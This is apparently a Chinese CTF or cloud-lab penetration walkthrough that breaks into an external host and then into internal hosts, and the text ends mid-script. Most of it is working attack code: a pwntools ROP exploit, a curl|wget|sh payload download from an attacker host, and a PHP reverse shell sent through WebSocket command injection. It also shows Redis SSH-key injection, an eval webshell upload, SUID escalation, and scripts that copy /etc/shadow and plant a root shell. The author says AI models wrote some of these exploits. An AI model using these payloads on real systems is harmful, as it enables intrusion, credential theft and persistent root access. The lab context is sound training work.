# 外网

这个靶子，其实还挺新颖的，也挺融合，常规扫一边之后记得扫一下全端口吧

```zsh
┌──(root㉿MJ)-[/tmp/test/yunjing]
└─# fscan -h 39.98.124.196

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
39.98.124.196:22 open
39.98.124.196:8080 open
39.98.124.196:8081 open
[*] alive ports len is: 3
start vulscan
[*] WebTitle http://39.98.124.196:8081 code:200 len:397    title:Directory listing for /
[+] InfoScan http://39.98.124.196:8081 [目录遍历]
[*] WebTitle http://39.98.124.196:8080 code:302 len:0      title:None 跳转url: http://39.98.124.196:8080/login;jsessionid=7C48FCE2B169F9F43F64C82BC79FF2F8
[*] WebTitle http://39.98.124.196:8080/login;jsessionid=7C48FCE2B169F9F43F64C82BC79FF2F8 code:200 len:8663   title:Login
```

8080是个shiro框架，8081是个py起的http服务器，shiro下有很多api接口（在前端js能看到），这里思路可以提取出来看看有没有未授权访问，但是我嫌麻烦没搞，能未授权下jar包反编译找key？

8081有个elf文件，是个ret2libc溢出好像，让ai看下就秒了，但是拿shell得打远程吧

```bash
fscan -h 39.98.124.196 -p 1-65535

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
39.98.124.196:22 open
39.98.124.196:8081 open
39.98.124.196:8080 open
39.98.124.196:65533 open
```
有个高端口，nc一下确实是这个elf的服务

```python
from pwn import *

# 偏移
offset = 312

# 地址
pop_rsi      = 0x40117e
pop_rax_rdi  = 0x401180
pop_rdx      = 0x401183
syscall      = 0x401187
binsh        = 0x402004   # "/bin/sh" 字符串地址

# 构造 payload
payload  = b'A' * offset
payload += p64(pop_rsi) + p64(0)          # rsi = 0 (argv)
payload += p64(pop_rdx) + p64(0)          # rdx = 0 (envp)
payload += p64(pop_rax_rdi) + p64(59) + p64(binsh)  # rax=59, rdi="/bin/sh"
payload += p64(syscall)                   # 触发 execve

p = remote('39.98.124.196', 65533)
p.sendline(payload)
p.interactive()
```


```zsh
┌──(.venv3)─(root㉿MJ)-[/tmp/test/yunjing]
└─# python3 exp.py
[+] Opening connection to 39.98.124.196 on port 65533: Done
[*] Switching to interactive mode
Pwn me
$ whoami
webapp
$
```

直接可以pwn掉了，写个私钥连上即可
<html>
<body>
<!--StartFragment--><!-- obsidian --><pre><code class="language-bash">webapp@Shiro:~$ find / -perm -4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/bin/umount
/usr/bin/mount
/usr/bin/stapbpf
/usr/bin/staprun
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/su
/usr/bin/pkexec
/usr/bin/at
/usr/bin/sudo
/usr/bin/base64
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/fusermount
</code></pre>
<p>base64有s位，直接读即可</p>
<pre><code class="language-bash">webapp@Shiro:/$ base64 flag | base64 -d
flag{16fc0d69-a7b9-0a5d-5ff6-8eab6776774f}
</code></pre>
<h1 data-heading="内网">内网</h1>
<p>依旧fscan开路，这里确实学到新东西了</p>

IP | 开放端口 | 服务/标题 | 漏洞/备注
-- | -- | -- | --
172.22.10.3 | 22, 80 | 80: HTTP，无标题，长度 931 | ThinkPHP 5.0.23 方法 RCE（fscan 已报）
172.22.10.154 | 22, 80 | 80: HTTP，无标题，长度 691 | 应用类型未知，待手动探测
172.22.10.155 | 22, 80, 9501 | 80: Apache2 Ubuntu 默认页  9501: HTTP 400，长度 83 | 9501 疑似 Swoole / Hyperf 等服务
  |   |   |  
  |   |   |  


<p>这里的<code>think\__include_file</code>是个tp内置函数，该说不说很有思路的绕过</p>
<pre><code class="language-php">function __include_file($file)
{
    return include $file;
}
</code></pre>
<p>直接rce，上线vshell即可</p>
<pre><code class="language-bash">┌──(root㉿MJ)-[/tmp/test/yunjing]
└─# pc -q python3 ez.py '(curl -fsSL -m180 http://172.22.10.22:10086/slt||wget -T180 -q http://172.22.10.22:10086/slt)|sh'

[*] cmd: (curl -fsSL -m180 http://172.22.10.22:10086/slt||wget -T180 -q http://172.22.10.22:10086/slt)|sh
</code></pre>
<pre><code class="language-bash">www-data@openrasp:/tmp$ ss -lnt
State            Recv-Q           Send-Q                      Local Address:Port                        Peer Address:Port           Process           
LISTEN           0                151                             127.0.0.1:3306                             0.0.0.0:*                                
LISTEN           0                4096                        127.0.0.53%lo:53                               0.0.0.0:*                                
LISTEN           0                128                               0.0.0.0:22                               0.0.0.0:*                                
LISTEN           0                70                              127.0.0.1:33060                            0.0.0.0:*                                
LISTEN           0                511                                     *:80                                     *:*                                
LISTEN           0                128                                  [::]:22                                  [::]:*                                
www-data@openrasp:/tmp$ 
</code></pre>
<p>有mysql，database和config里都没有密码，在openRASP的日志里面</p><!--EndFragment-->
</body>
</html>
`/opt/logs/alarm/alarm.log.2025-01-20`

有s位的find直接提权即可
```bash
www-data@openrasp:/$ find / -perm -4000 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/bin/su
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/find
/usr/bin/sudo
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/fusermount
/usr/bin/pkexec
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/at
/snap/core20/1828/usr/bin/chfn
/snap/core20/1828/usr/bin/chsh
/snap/core20/1828/usr/bin/gpasswd
/snap/core20/1828/usr/bin/mount
/snap/core20/1828/usr/bin/newgrp
/snap/core20/1828/usr/bin/passwd
/snap/core20/1828/usr/bin/su
/snap/core20/1828/usr/bin/sudo
/snap/core20/1828/usr/bin/umount
/snap/core20/1828/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1828/usr/lib/openssh/ssh-keysign
/snap/core20/2434/usr/bin/chfn
/snap/core20/2434/usr/bin/chsh
/snap/core20/2434/usr/bin/gpasswd
/snap/core20/2434/usr/bin/mount
/snap/core20/2434/usr/bin/newgrp
/snap/core20/2434/usr/bin/passwd
/snap/core20/2434/usr/bin/su
/snap/core20/2434/usr/bin/sudo
/snap/core20/2434/usr/bin/umount
/snap/core20/2434/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2434/usr/lib/openssh/ssh-keysign
/snap/snapd/23545/usr/lib/snapd/snap-confine
/snap/snapd/18357/usr/lib/snapd/snap-confine
www-data@openrasp:/$ find . -exec /bin/sh -p \; -quit
# id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
# 
```


172.22.10.155的9501是个Swoole服务，**这里很神奇，究竟是怎么知道有命令注入的，很迷惑**

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import socket, base64, os, hashlib, struct, json

HOST = "172.22.10.155"
PORT = 9501
PATH = "/"

def ws_send_text(sock, text):
    """发送 WebSocket 文本帧（客户端必须掩码）"""
    payload = text.encode()
    # FIN + opcode(1=text)
    frame = bytearray([0x81])
    # MASK=1 + payload length
    if len(payload) < 126:
        frame.append(0x80 | len(payload))
    elif len(payload) < 65536:
        frame.append(0x80 | 126)
        frame += struct.pack(">H", len(payload))
    else:
        frame.append(0x80 | 127)
        frame += struct.pack(">Q", len(payload))
    # 4 字节掩码 key
    mask = os.urandom(4)
    frame += mask
    # 掩码 payload
    masked = bytes(b ^ mask[i % 4] for i, b in enumerate(payload))
    frame += masked
    sock.sendall(bytes(frame))

def ws_recv(sock, timeout=5):
    """接收一帧（简化版，处理小帧）"""
    sock.settimeout(timeout)
    try:
        hdr = sock.recv(2)
        if len(hdr) < 2:
            return None
        b1, b2 = hdr[0], hdr[1]
        length = b2 & 0x7f
        if length == 126:
            length = struct.unpack(">H", sock.recv(2))[0]
        elif length == 127:
            length = struct.unpack(">Q", sock.recv(8))[0]
        masked = b2 & 0x80
        if masked:
            mask = sock.recv(4)
        data = b""
        while len(data) < length:
            chunk = sock.recv(length - len(data))
            if not chunk:
                break
            data += chunk
        if masked:
            data = bytes(b ^ mask[i % 4] for i, b in enumerate(data))
        return data.decode(errors="replace")
    except socket.timeout:
        return None
    except Exception as e:
        return f"[recv_err] {e}"

# 1. TCP 连接
s = socket.create_connection((HOST, PORT), timeout=10)

# 2. WebSocket 握手
key = base64.b64encode(os.urandom(16)).decode()
req = (
    f"GET {PATH} HTTP/1.1\r\n"
    f"Host: {HOST}:{PORT}\r\n"
    f"Upgrade: websocket\r\n"
    f"Connection: Upgrade\r\n"
    f"Sec-WebSocket-Key: {key}\r\n"
    f"Sec-WebSocket-Version: 13\r\n"
    f"\r\n"
)
s.sendall(req.encode())

# 3. 读握手响应
resp = b""
while b"\r\n\r\n" not in resp:
    chunk = s.recv(4096)
    if not chunk:
        break
    resp += chunk
print(f"[+] 握手响应:\n{resp.decode(errors='replace')[:300]}")

# 4. 发 payload
payload = ";php -r '$s=fsockopen(\"172.22.10.22\",2332);proc_open(\"/bin/bash\",[$s,$s,$s],$p);'"
msg = json.dumps({"emit": "msg", "message": "123", "token": payload})
print(f"\n[>] Sending: {msg}")
ws_send_text(s, msg)

# 5. 收响应
r = ws_recv(s, timeout=5)
print(f"[<] Received: {r}")

s.close()
```

拿到shell，上线vshell即可

```bash
www-data@redis:/tmp$ ss -lnt
State            Recv-Q           Send-Q                       Local Address:Port                       Peer Address:Port           Process           
LISTEN           0                511                              127.0.0.1:6379                            0.0.0.0:*                                
LISTEN           0                4096                         127.0.0.53%lo:53                              0.0.0.0:*                                
LISTEN           0                128                                0.0.0.0:22                              0.0.0.0:*                                
LISTEN           0                512                                0.0.0.0:9501                            0.0.0.0:*                                
LISTEN           0                511                                      *:80                                    *:*                                
LISTEN           0                128                                   [::]:22                                 [::]:*        
```

开了redis

```bash
www-data@redis:/tmp$ ps -aux | grep redis
root         562  0.0  0.1  58320  7976 ?        Ssl  10:14   0:01 /opt/redis/redis-server 127.0.0.1:6379
www-data    1573  0.0  0.0   9032   656 pts/0    S+   10:52   0:00 grep redis
```

root启动的，直接未授权秒了，可以看我老兄弟写的[[Redis未授权访问漏洞复现 - the0n3](https://the0n3.top/pages/cd7cec/)](https://the0n3.top/pages/cd7cec/)
很详细，直接按着打就行，推荐偷一份留本地

```bash
www-data@redis:/tmp$ (echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > key.txt
www-data@redis:/tmp$ cat key.txt | redis-cli -h 127.0.0.1 -x set sshpub
OK
www-data@redis:/tmp$ redis-cli
127.0.0.1:6379> config set dir /root/.ssh
OK
127.0.0.1:6379> config set dbfilename authorized_keys
OK
127.0.0.1:6379> keys *
1) "sshpub"
127.0.0.1:6379> get sshpub
"\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDM4qXRwDvTl9ctJFAuhiWRSobyowSJ6tnlykH6JNAa5rw/7X30dRmROBSdxs68lkvXp7y6xgjHtyfhzNZFtOw22xLBk7fIrt++7jF4h3fnIen/PokDThRJFFPi/rBTADsVrfqCcfhSUBCks2rKoMr4SJKjAwZK3znfKEtKQWhOz7o9zipCMoLatte1TWGmL0OY8f7hJxQpCwmKxK2LFI3lA8eS5pzlQ+4lzdNW3TytxRynKV1LUbkGJ7x/aNrood/UphbqxVVrgx/UXlZRPivit5Ya0ilp/d5uEpdBtGT395uCxKTqSDHQfvalbqbIdGZYq8Ilx+jeKMDFzDZVgACb29DIORYjKEzCIpiLALsTB8MdY2kcrkk6rkkf/Fy+vGkdJ0Q9MzvJ/PRbigKtx/zHiUp+j9j/nBBmPMp5FNzBBeMBlH76DJlDcw8cBTZCVYz1HiqdL4YhXvcoZ7yLj7qa0r7MpFwnobcpMc7mlJLqcf2Pltj4RoLxAu6KLD4ZcfU= root@MJ\n\n\n\n"
127.0.0.1:6379> save
OK
127.0.0.1:6379> 
```

ssh上去即可

```bash
root@redis:~# cat flag
flag{4b9581e7-131c-414e-a65f-209a0e533eb8}
```


`/opt/server.php`

```php
<?php
class WebSocket
{
  const HOST = '0.0.0.0';
  const PORT = '9501';
  const IMAGE_UPLOAD_API_URL = 'http://172.22.10.154/api/upload/image';
  const FILE_UPLOAD_API_URL = 'http://172.22.10.154/api/upload/file';

  public $server = null;
  const ALLOWED_IMAGE_EXTENSIONS = [
    'jpg', 'jpeg', 'png', 'gif', 'bmp', 'ico',
  ];

  const ALLOWED_FILE_EXTENSIONS = [
    'pdf', 'zip', 'rar', 'txt', 'doc', 'docx', 'psd', 'xls', 'xlsx', 'ppt',
  ];

  public function __construct()
  {
    $redis = new \Redis();
    $redis->pconnect('127.0.0.1', 6379, 0);

    $this->server = new swoole_websocket_server(self::HOST, self::PORT);
    $this->server->redis = $redis;

    $this->server->set([
      'task_worker_num' => 10,
      'max_connection' => 10000,
      'daemonize' => 0,
    ]);

    $this->server->on('open', [$this, 'onOpen']);
    $this->server->on('message', [$this, 'onMessage']);
    $this->server->on('task', [$this, 'onTask']);
    $this->server->on('finish', [$this, 'onFinish']);
    $this->server->on('close', [$this, 'onClose']);

    $this->server->start();
  }
  private function isImageExtensionAllowed($fileName)
  {
    $fileExtension = pathinfo($fileName, PATHINFO_EXTENSION);
    return in_array(strtolower($fileExtension), self::ALLOWED_IMAGE_EXTENSIONS);
  }
  private function isFileExtensionAllowed($fileName)
  {
    $fileExtension = pathinfo($fileName, PATHINFO_EXTENSION);
    return in_array(strtolower($fileExtension), self::ALLOWED_FILE_EXTENSIONS);
  }


  public function onOpen($server, $frame)
  {
    // null
  }

  public function onMessage($server, $frame)
  {
    $data = json_decode($frame->data, true);
    if (isset($data['emit']) && isset($data['token'])) {
      $token = $data['token'];
      $messageKey = "chat:messages:$token";

      switch ($data['emit']) {
        case 'getHistoryMessages':
          $messages = $this->server->redis->lRange($messageKey, 0, -1);
          if ($messages) {
            $messages = array_map(function ($msg) {
              return json_decode($msg, true);
            }, $messages);
            $server->push($frame->fd, json_encode([
              'emit' => 'historyMessages',
              'messages' => $messages,
            ]));
          }
          break;
        case 'fileUpload':
          $server->task($data);
          break;
        case 'imageUpload':
          $server->task($data);
          break;
        case 'msg':
          $message = [
            'type' => 'text',
            'content' => $data['message'],
            'timestamp' => time()
          ];

          $command = escapeshellarg(json_encode($message));
          exec("redis-cli RPUSH $messageKey $command");
          break;
        case 'seatAssigned':
          $server->push($frame->fd, json_encode([
            'emit' => 'seatAssigned',
            'message' => '\u5750\u5e2d\u5206\u914d\u6210\u529f\uff0c\u60a8\u5df2\u4e0e\u5750\u5e2d\u4eba\u5458\u8fde\u63a5\u3002'
          ]));
          break;
        default:
          $server->push($frame->fd, json_encode([
            'emit' => 'error',
            'message' => 'Invalid message format'
          ]));
          break;
      }
    }
    elseif ($data === null) {
      $token = bin2hex(random_bytes(16));
      $server->push($frame->fd, json_encode([
        'emit' => 'status',
        'message' => 'success',
        'id' => $frame->fd,
        'token' => $token
      ]));
    } else {
      $server->push($frame->fd, json_encode([
        'emit' => 'error',
        'message' => 'Invalid message format'
      ]));
    }
  }

  public function onTask($server, $task_id, $src_worker_id, $data)
  {
    if ($data['emit'] === 'fileUpload') {
      $response = $this->uploadFile($data['file'], $data['token']);
      $this->sendUploadResponse($server, $data['id'], $response);
    } elseif ($data['emit'] === 'imageUpload') {
      $response = $this->uploadImage($data['file'], $data['token']);
      $this->sendUploadResponse($server, $data['id'], $response);
    }
  }

  private function sendUploadResponse($server, $fd, $response)
  {
    if (isset($response['emit'])) {
      $messageKey = "chat:messages:{$response['token']}";
      $this->server->redis->rPush($messageKey, json_encode([
        'type' => $response['emit'] === 'fileUploaded' ? 'file' : 'image',
        'content' => $response['fileUrl'] ?? $response['imageUrl'],
        'timestamp' => time()
      ]));

      try {
        $server->push($fd, json_encode($response));
      }catch (\Exception $exception){
        $server->push($fd, json_encode([
          'emit' => 'error',
          'message' => 'Type error',
        ]));
      }
    }
  }


  public function onFinish($server, $task_id, $data)
  {
    // null
  }


  public function onClose($server, $fd)
  {
    $this->server->redis->hDel('connections', $fd);
  }

  public function uploadFile($fileData, $token)
  {
    $fileName = $fileData['name'];
    $fileBase64 = base64_decode($fileData['data']);

    $tempFilePath = sys_get_temp_dir() . '/' . uniqid() . '-' . $fileName;
    file_put_contents($tempFilePath, $fileBase64);
    if (!$this->isFileExtensionAllowed($fileName)) {
      unlink($tempFilePath);
      return [
        'emit' => 'error',
        'message' => 'File type error',
      ];
    }
    $curl = curl_init();
    $postFields = [
      'File' => new CURLFile($tempFilePath, mime_content_type($tempFilePath), $fileName)
    ];

    curl_setopt_array($curl, [
      CURLOPT_URL => self::FILE_UPLOAD_API_URL,
      CURLOPT_RETURNTRANSFER => true,
      CURLOPT_POST => true,
      CURLOPT_POSTFIELDS => $postFields,
    ]);

    $response = curl_exec($curl);
    curl_close($curl);

    unlink($tempFilePath);

    if ($response) {
      $responseData = json_decode($response, true);
      if ($responseData['code'] === 0) {
        return [
          'emit' => 'fileUploaded',
          'token'=> $token,
          'fileUrl' => 'http://172.22.10.154' . $responseData['data']['src']
        ];
      }
    }

    return [
      'emit' => 'error',
      'message' => 'File upload failure'
    ];
  }

  public function uploadImage($fileData, $token)
  {
    $fileName = $fileData['name'];
    $fileBase64 = base64_decode($fileData['data']);

    $tempFilePath = sys_get_temp_dir() . '/' . uniqid() . '-' . $fileName;
    file_put_contents($tempFilePath, $fileBase64);
    if (!$this->isImageExtensionAllowed($fileName)) {
      unlink($tempFilePath);
      return [
        'emit' => 'error',
        'message' => 'Image type error',
      ];
    }
    $curl = curl_init();
    $postFields = [
      'File' => new CURLFile($tempFilePath, mime_content_type($tempFilePath), $fileName)
    ];

    curl_setopt_array($curl, [
      CURLOPT_URL => self::IMAGE_UPLOAD_API_URL,
      CURLOPT_RETURNTRANSFER => true,
      CURLOPT_POST => true,
      CURLOPT_POSTFIELDS => $postFields,
    ]);

    $response = curl_exec($curl);
    curl_close($curl);

    unlink($tempFilePath);

    if ($response) {
      $responseData = json_decode($response, true);
      if ($responseData['code'] === 0) {
        return [
          'emit' => 'imageUploaded',
          'token'=> $token,
          'imageUrl' => 'http://172.22.10.154' . $responseData['data']['src']
        ];
      }
    }

    return [
      'emit' => 'error',
      'message' => 'Image upload failure'
    ];
  }




}
$socket = new WebSocket();

```

可以看到跟154连接有文件上传的接口，同时154也是tp，ThinkPHP V5.1.41 LTS。这个版本有多语言LFI但是利用条件被禁用了吧，我反正没成功

```bash
root@redis:~# echo '<?php @eval($_POST["cmd"]);?>' > shell.php
root@redis:~# curl -X POST http://172.22.10.154/api/upload/file -F "File=@shell.php;type=application/octet-stream"
{"code":0,"msg":"上传成功","data":{"src":"\/uploads\/file\/20260927\/2b9be68e8cc3f192960ed9ce6b72cdd0.php"}}root@redis:~#
```
蚁剑连上即可

```bash
(www-data:/) $ find / -perm -4000 2>/dev/null

/usr/bin/pkexec

/usr/bin/staprun

/usr/bin/chfn

/usr/bin/fusermount

/usr/bin/stapbpf

/usr/bin/mount

/usr/bin/passwd

/usr/bin/chsh

/usr/bin/at

/usr/bin/newgrp

/usr/bin/sudo

/usr/bin/gpasswd

/usr/bin/su

/usr/bin/umount

/usr/bin/check

/usr/lib/policykit-1/polkit-agent-helper-1

/usr/lib/dbus-1.0/dbus-daemon-launch-helper

/usr/lib/openssh/ssh-keysign

/usr/lib/eject/dmcrypt-get-device

(www-data:/) $
```

这里看到有个check，s位

```bash
(www-data:/) $ file /usr/bin/check

/usr/bin/check: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=e11b09354100520c8559846ff4503a43cf674387, for GNU/Linux 3.2.0, stripped

(www-data:/) $ check --help

(www-data:/) $
```

是个自定义elf文件，连个帮助都没有，喊出来re手子，秒了。这里该说不说豆姐有点实力

```bash
#!/bin/bash
# ============================================================
# Exploit: SUID root /usr/bin/check  -> root
#
# check 有两个分支(main@0x1918):
#   argv[1] == "command.enc" -> func_1746: 固定密钥, 但【无 setuid】, 不提权
#   argv[1] != "command.enc" -> func_154c: 调 setuid(0)+setgid(0) 后再 system(),
#                                          密钥/IV = srand(time(0)) (按秒变化)
# 因此: 以 root 执行任意命令的关键是走 func_154c 分支, 并爆破那一秒的密钥。
#   密钥/IV 每个字节 = first_rand(T) & 0xff  (16字节全相同)
#
# 用法(在目标机 www-data 下执行):  bash ./exploit_check.sh
# 成功后会:
#   - 生成 SUID root 的 /tmp/x (bash 副本), 执行 /tmp/x -p 获得 root shell
#   - 把 /etc/shadow 复制到 /tmp/shadow.out (万一 /tmp 是 noexec, 也可直接读 shadow)
# 依赖: python3 (算 rand) + openssl (AES-128-CBC)。无 openssl 时改用 python3 加密(见下)。
# ============================================================
cd /tmp || exit 1
rm -f /tmp/evil /tmp/x /tmp/shadow.out

# 以 root 执行的命令(会交给 system())。可根据需要改。
CMD='cp /bin/bash /tmp/x;chmod 4755 /tmp/x;cat /etc/shadow>/tmp/shadow.out'

# 计算 glibc 首次 rand()(权威算法: 输出 = r[344] >> 1)
first_rand() {
  python3 -c "
import sys
s=int(sys.argv[1])
r=[0]*345
r[0]=s & 0xffffffff
for i in range(1,31): r[i]=(16807*r[i-1])%2147483647
for i in range(31,34): r[i]=r[i-31]
for i in range(34,345): r[i]=(r[i-31]+r[i-3])%4294967296
print(r[344]>>1)
" "$1"
}

# 生成 /tmp/evil: 用 key=iv=[kb]*16 对 CMD 做 AES-128-CBC, 密文不含 0x00
#  (若含 0x00, 换填充字节重试; 填充在命令 NUL 之后, 不影响执行)
make_evil() {
  local kb="$1"
  local kh f key
  kh=$(printf '%02x' "$kb")
  key="$kh$kh$kh$kh$kh$kh$kh$kh$kh$kh$kh$kh$kh$kh$kh$kh"
  for f in 0 1 2 3 4 5 6 7 8 9; do
    python3 - "$CMD" "$f" <<'PY'
import sys
cmd=sys.argv[1].encode()
p=cmd+b'\x00'
n=(16-len(p)%16)%16
p+=bytes([int(sys.argv[2])])*n
open('/tmp/.pt','wb').write(p)
PY
    if command -v openssl >/dev/null 2>&1; then
      openssl enc -aes-128-cbc -K "$key" -iv "$key" -nopad -in /tmp/.pt -out /tmp/evil 2>/dev/null
    else
      # 无 openssl 时的 python3 兜底(需 pycryptodome)
      python3 - "$key" <<'PY'
import sys
try:
    from Crypto.Cipher import AES
except Exception:
    sys.exit(2)
key=bytes.fromhex(sys.argv[1])
c=AES.new(key,AES.MODE_CBC,key)
open('/tmp/evil','wb').write(c.encrypt(open('/tmp/.pt','rb').read()))
PY
      [ $? -eq 2 ] && return 1
    fi
    if ! od -An -tx1 /tmp/evil | tr -d ' \n' | grep -q '00'; then
      return 0
    fi
  done
  return 1
}

echo "[*] 开始爆破密钥(按秒), 大约需要 10~15 秒 ..."
end=$(( $(date +%s) + 14 ))
while [ "$(date +%s)" -lt "$end" ]; do
  T=$(date +%s)
  kb=$(( $(first_rand "$T") & 255 ))
  if make_evil "$kb"; then
    /usr/bin/check /tmp/evil &     # 触发 func_154c -> setuid(0) -> system(CMD) as root
  fi
  sleep 0.4
done

echo "[*] 等待 root 命令落地 ..."
for i in $(seq 1 10); do
  if [ -u /tmp/x ]; then
    echo "[+] 成功! SUID root shell: /tmp/x"
    ls -l /tmp/x
    echo "[+] 执行  /tmp/x -p  获取 root shell"
    exit 0
  fi
  sleep 1
done

echo "[-] 未检测到 /tmp/x, 检查 /tmp/shadow.out 是否生成; 若都没有, 重跑本脚本"

```

虽然豆姐的过程可能有点难看，最终也是能出s位bash的，但是还是比不上kimi3，我只给kimi发了个check文件，然后就拿下了，昨天豆姐的成功了，今天复现没行，看来豆姐还是不稳

```python

#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# check SUID 提权利用: key = rand_byte(time(0))*16, iv = rand_byte(time(0)+2)*16, AES-128-CBC
import ctypes, os, subprocess, sys, time

libc = ctypes.CDLL("libc.so.6")
def rand_byte(seed):
    libc.srand(ctypes.c_uint(seed & 0xffffffff))
    return libc.rand() % 256

SBOX = [
0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,
0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,
0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,
0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,
0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,
0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,
0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,
0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,
0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,
0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,
0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,
0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,
0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,
0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,
0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,
0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16]
RCON = [0x01,0x02,0x04,0x08,0x10,0x20,0x40,0x80,0x1b,0x36]
def _mul(a,b):
    r=0
    while b:
        if b&1: r^=a
        a<<=1
        if a&0x100: a^=0x11b
        b>>=1
    return r&0xff
def _expand(key):
    w=list(key); i=16; r=0
    while i<176:
        t=w[i-4:i]
        if i%16==0:
            t=[SBOX[t[1]]^RCON[r],SBOX[t[2]],SBOX[t[3]],SBOX[t[0]]]; r+=1
        for b in t: w.append(w[i-16]^b); i+=1
    return w
def _block(blk,w):
    s=[blk[i]^w[i] for i in range(16)]
    for rnd in range(1,11):
        s=[SBOX[b] for b in s]
        s=[s[0],s[5],s[10],s[15],s[4],s[9],s[14],s[3],s[8],s[13],s[2],s[7],s[12],s[1],s[6],s[11]]
        if rnd<10:
            ns=[]
            for c in range(4):
                col=s[4*c:4*c+4]
                ns+=[_mul(col[0],2)^_mul(col[1],3)^col[2]^col[3],
                     col[0]^_mul(col[1],2)^_mul(col[2],3)^col[3],
                     col[0]^col[1]^_mul(col[2],2)^_mul(col[3],3),
                     _mul(col[0],3)^col[1]^col[2]^_mul(col[3],2)]
            s=ns
        s=[s[i]^w[16*rnd+i] for i in range(16)]
    return bytes(s)
def aes_cbc_encrypt(pt,key,iv):
    w=_expand(key); out=b""; prev=iv
    for i in range(0,len(pt),16):
        enc=_block(bytes(a^b for a,b in zip(pt[i:i+16],prev)),w)
        out+=enc; prev=enc
    return out

def make_ct(cmd, t):
    key = bytes([rand_byte(t)])*16
    iv = bytes([rand_byte(t+2)])*16
    for v in range(676):                   # 前缀无害变量赋值, 让首块明文也变化
        pt = ("_=%c%c;" % (65+v%26, 65+(v//26)%26)).encode() + cmd.encode() + b" #" + b"\x00"  # null 截断 strlen
        pt += b"A" * ((16 - len(pt) % 16) % 16)
        c = aes_cbc_encrypt(pt, key, iv)   # 密文不能含 null(文件按 fgets/strlen 读取)
        if b"\x00" not in c:
            return c
    return None

CMD = sys.argv[1] if len(sys.argv) > 1 else "chmod u+s /bin/bash #"
BIN = sys.argv[2] if len(sys.argv) > 2 else "./check"
ENC = "/tmp/.cmd.enc"
if len(CMD) <= 8 or any(not (32 <= ord(c) < 127) for c in CMD):
    sys.exit("命令需>8字符且为可打印ASCII")
print("[*] CMD:", CMD)

import stat as _st
def ok():
    try: return bool(os.stat("/bin/bash").st_mode & _st.S_ISUID)
    except Exception: return False

for attempt in range(1, 401):
    t = int(time.time()) + 1
    ct = make_ct(CMD, t)
    if ct is None:
        t += 1; ct = make_ct(CMD, t)
        if ct is None: continue
    open(ENC, "wb").write(ct)
    while int(time.time()) < t: time.sleep(0.003)
    subprocess.run([BIN, ENC], capture_output=True, timeout=15)
    if "chmod" in CMD and ok():
        print(f"[+] 成功! (第{attempt}次) /bin/bash 已带S位, 执行: bash -p")
        break
    if attempt % 10 == 0: print(f"[*] 已尝试 {attempt} 次...")
else:
